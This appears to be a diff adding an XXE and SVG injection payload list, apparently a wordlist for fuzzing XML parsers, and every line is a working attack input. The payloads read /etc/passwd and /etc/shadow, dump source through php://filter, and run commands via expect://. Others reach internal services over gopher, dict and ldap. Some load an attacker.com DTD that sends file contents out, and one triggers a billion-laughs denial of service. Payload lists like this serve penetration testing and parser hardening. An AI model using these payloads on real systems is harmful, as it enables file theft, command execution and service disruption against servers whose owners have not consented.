@@ -1,0 +1,46 @@
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">%eval;%error;]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///c:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">%eval;%error;]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><user>&xxe;</user>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><user>&xxe;</user>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=index.php">]><user>&xxe;</user>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "expect://id">]><user>&xxe;</user>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "expect://ls">]><user>&xxe;</user>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">]><user>&xxe;</user>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://127.0.0.1/evil.dtd">%dtd;]><doc>&send;</doc> <!-- Server needs evil.dtd containing <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>"> <!ENTITY % file SYSTEM "file:///etc/passwd"> %all; -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE image [<!ENTITY xxe SYSTEM "jar:http://127.0.0.1/evil.jar!/file.xml">]><image>&xxe;</image>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE image [<!ENTITY xxe SYSTEM "netdoc://127.0.0.1/evil.xml">]><image>&xxe;</image>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE image [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO localhost%250d%250aMAIL FROM:<root@localhost>%250d%250aRCPT TO:<root@localhost>%250d%250aDATA%250d%250aXXE%250d%250a.%250d%250aQUIT%250d%250a">]><image>&xxe;</image>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE image [<!ENTITY xxe SYSTEM "dict://127.0.0.1:11211/stat">]><image>&xxe;</image>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE image [<!ENTITY xxe SYSTEM "ldap://127.0.0.1:389/%20%20%20%20%20%20%20%20%20%20%20%20">]><image>&xxe;</image>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % pe SYSTEM "file:///">%pe;]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % pe SYSTEM "file:///c:/">%pe;]>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd" [<!ENTITY test "Test">]><html xmlns="http://www.w3.org/1999/xhtml"><body>&test;</body></html>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE html [<!ENTITY test "Test">]><html xmlns="http://www.w3.org/1999/xhtml"><body>&test;</body></html>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % a "XXE"><!ENTITY % b "<!ENTITY c '%a;'>">%b;]><root>&c;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY a "XXE"><!ENTITY b "&a;"><!ENTITY c "&b;">]><root>&c;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY a "XXE"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]><root>&c;</root> <!-- Billion Laughs, use with caution -->
+<?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator><rdf:Seq><rdf:li><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></rdf:li></rdf:Seq></dc:creator></rdf:Description></rdf:RDF></x:xmpmeta><?xpacket end="w"?>
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-16BE"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-16LE"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-32"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-32BE"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-32LE"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="macintosh"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ebcdic-cp-us"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ibm037"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ibm1047"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ibm1140"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="cp037"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="cp1047"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="cp1140"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="expect://ls"></image></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="http://127.0.0.1/"></image></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/passwd"></image></svg>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" version="1.1" height="200"><style>@import url(http://127.0.0.1/);</style></svg>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" version="1.1" height="200"><foreignObject width="100" height="100"><iframe xmlns="http://www.w3.org/1999/xhtml" src="file:///etc/passwd"></iframe></foreignObject></svg>
